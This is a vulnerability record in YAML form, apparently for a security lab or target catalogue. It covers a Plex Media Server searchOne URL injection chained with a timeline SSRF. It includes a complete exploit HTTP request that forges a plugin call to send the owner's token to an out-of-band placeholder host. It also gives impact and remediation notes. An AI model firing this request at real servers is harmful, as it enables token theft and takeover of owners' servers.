@@ -1,0 +1,102 @@
+id: vt-2026-96654
+
+info:
+  name: "Plex Media Server < 1.43.3.10861 - URL Injection in agent searchOne (loopback plugin-API pivot)"
+  author: omarkurt
+  description: |
+    Plex Media Server before 1.43.3.10861 does not neutralize the identifier value passed to the agent searchOne handler (CWE-84). Because of a broken @lock guard in agentservice.py, the identifier is spliced unencoded into the loopback URL http://127.0.0.1:32400/:/plugins/%s/messaging/%s, letting an attacker call other plugins' functions with attacker-chosen parameters. Chained after the unauthenticated companion-timeline SSRF (CVE-2026-96652), it forges arbitrary plugin calls and steals the owner token through TheTVDB GetResultFromNetwork and the unbounded 127.0.0.1 token-attach prefix match. Listed in CISA KEV and exploited in the wild (plex2shell).
+  targets:
+    - plex
+    - plex_media_server
+  type: CVE
+  cve: CVE-2026-96654
+  cwe: CWE-84
+  cvss:
+    score: "6.5"
+    severity: medium
+    metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+  affected_versions:
+    - "< 1.43.3.10861"
+  fixed_version: "1.43.3.10861"
+  tags:
+    - cve
+    - cve-2026
+    - plex
+    - url-injection
+    - ssrf-chain
+    - kev
+    - cwe-84
+    - unauth
+    - plex2shell
+  references:
+    - https://vulnerabletarget.com/VT-2026-96654
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-96654
+    - https://www.cve.org/CVERecord?id=CVE-2026-96654
+    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-96654
+    - https://raw.githubusercontent.com/cisagov/CSAF/develop/csaf_files/IT/white/2026/va-26-266-01.json
+    - https://zmain.info/blog/plex2shell
+    - https://github.com/code-zm/plex2shell
+    - https://forums.plex.tv/t/plex-media-server/30447/711
+
+vulnerabilities:
+  - id: searchone_url_injection
+    name: "Plex searchOne identifier URL injection via companion timeline subscribe"
+    endpoint: /player/timeline/subscribe
+    method: GET
+    request: |
+      GET /player/timeline/subscribe?deviceClass=pc&protocolCapabilities=playback&protocolVersion=1&protocol=http%3A%2F%2F127.0.0.1%3A32400%2Fsystem%2Fagents%2Fz%2FsearchOne%3FmediaType%3D1%26lang%3Den%26identifier%3Dcom.plexapp.agents.thetvdb%252Ffunction%252FGetResultFromNetwork%253Furl%253Dhttp%253A%252F%252F{{interactsh-url}}%2523&port=1337&commandID=1&X-Plex-Target-Client-Identifier={{cid}} HTTP/1.1
+      Host: {{Hostname}}
+      X-Plex-Token: {{tok}}
+      X-Plex-Client-Identifier: {{cid}}
+      X-Plex-Platform: {{poc}}
+      X-Plex-Platform-Version: 1
+      X-Plex-Product: {{poc}}
+      X-Plex-Version: 1
+      X-Plex-Device: {{poc}}
+      X-Plex-Device-Name: {{poc}}
+      X-Plex-Model: {{poc}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: text/xml;charset=utf-8
+      Content-Length: 0
+      X-Plex-Protocol: 1.0
+
+technical: |
+  The agent service handler for searchOne builds an internal loopback request with
+  the format string http://127.0.0.1:32400/:/plugins/%s/messaging/%s. The
+  identifier parameter is inserted into this URL without percent-encoding, and the
+  @lock guard in agentservice.py that should restrict the call is broken, so the
+  value is not validated. An attacker can therefore inject path and query
+  separators (for example function/GetResultFromNetwork?url=...) and make Plex
+  invoke any other plugin's messaging function with attacker-chosen parameters.
+  Reached unauthenticated by chaining the companion-timeline SSRF
+  (CVE-2026-96652), the pivot forges a plugin call to TheTVDB GetResultFromNetwork,
+  which performs an outbound request to an attacker-controlled host. The
+  token-attach logic decides whether to add the server's X-Plex-Token by an
+  unbounded prefix match on 127.0.0.1, so the owner token is attached to the
+  outbound request and leaks to the attacker.
+
+impact: |
+  Exploitation pivots through the loopback plugin API to forge arbitrary plugin
+  calls and exfiltrate the Plex owner's admin token to an attacker-controlled
+  server. With the owner token the attacker gains full owner-level access to the
+  Plex Media Server, including its libraries, settings and administrative
+  functions, which plex2shell chains further toward code execution. The issue is
+  listed in the CISA KEV catalog and is exploited in the wild.
+
+remediation:
+  - "Upgrade to Plex Media Server 1.43.3.10861 or later"
+  - "Also patch the companion-timeline SSRF (CVE-2026-96652) that makes this reachable without authentication"
+  - "Restrict access to the Plex port (32400) to trusted networks and do not expose it to the internet"
+  - "Rotate the Plex owner token and review authorized devices if compromise is suspected"
+
+poc:
+  nuclei:
+    - "vt-2026-96654.nuclei.yaml"
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+
+post-install:
+  - "Access http://localhost:<mapped-port>/identity to confirm the Plex server is up and check its version"
